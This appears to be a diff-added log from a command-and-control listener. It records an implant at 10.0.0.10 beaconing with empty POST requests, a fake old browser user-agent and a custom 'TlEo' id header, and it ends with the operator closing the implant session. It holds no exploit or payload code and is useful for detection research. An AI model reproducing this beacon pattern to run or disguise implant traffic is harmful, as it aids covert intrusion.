+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:47:08'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49417</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:47:08'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000007e
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000007e</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:47:08'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49417</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>126</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:47:08'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49417</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:47:11'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:47:11'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49418</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:47:11'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000007f
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000007f</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:47:11'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49418</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>127</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:47:11'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49418</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:47:14'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:47:14'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49419</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:47:14'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000080
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000080</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:47:14'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49419</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>128</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:47:14'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49419</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:47:16'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:47:16'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49420</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:47:16'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000081
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000081</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:47:16'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49420</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>129</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:47:16'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49420</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:47:19'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:47:19'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49421</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:47:19'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000082
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000082</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:47:19'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49421</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>130</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:47:19'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49421</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:47:22'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:47:22'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49422</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:47:22'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000083
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000083</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:47:22'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49422</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>131</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:47:22'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49422</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:47:25'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:47:25'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49423</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:47:25'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000084
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000084</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:47:25'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49423</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>132</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:47:25'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49423</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:49:06'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:49:06'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49424</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:49:06'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000000
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000000</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:49:06'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49424</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>0</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<ErrorString lptimestamp='2017-10-16T09:49:06'>Connection already exists for id e59a2bc9
+</ErrorString>
+<Info lptimestamp='2017-10-16T09:49:06'>Sending close to implant e59a2bc9</Info>
+</CommandTasking>
+<Cancelled lptimestamp='2017-10-16T09:49:08'/>
+</DataLog>
